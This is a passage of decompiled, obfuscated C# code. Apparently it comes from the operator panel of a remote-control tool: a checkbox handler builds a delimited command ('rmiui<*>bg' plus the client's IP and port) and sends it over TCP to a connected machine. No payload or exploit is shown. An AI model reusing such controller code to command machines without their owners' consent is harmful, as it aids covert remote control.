		private void Checkbg_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.Checkbg.Checked && this.gclass8_0 != null)
			{
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					this.gclass8_0.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"rmiui<*>bg",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x040007DF RID: 2015
		public GClass8 gclass8_0;

		// Token: 0x040007E0 RID: 2016
		public bool bool_0;

		// Token: 0x040007E1 RID: 2017
		public bool bool_1;

		// Token: 0x040007E2 RID: 2018
		public bool bool_2;

		// Token: 0x020000C0 RID: 192
		// (Invoke) Token: 0x06000E55 RID: 3669
		public delegate void GDelegate19(object[] objects_0);

		// Token: 0x020000C1 RID: 193
		// (Invoke) Token: 0x06000E59 RID: 3673
		public delegate void GDelegate20(object[] objects_0);
	}
}
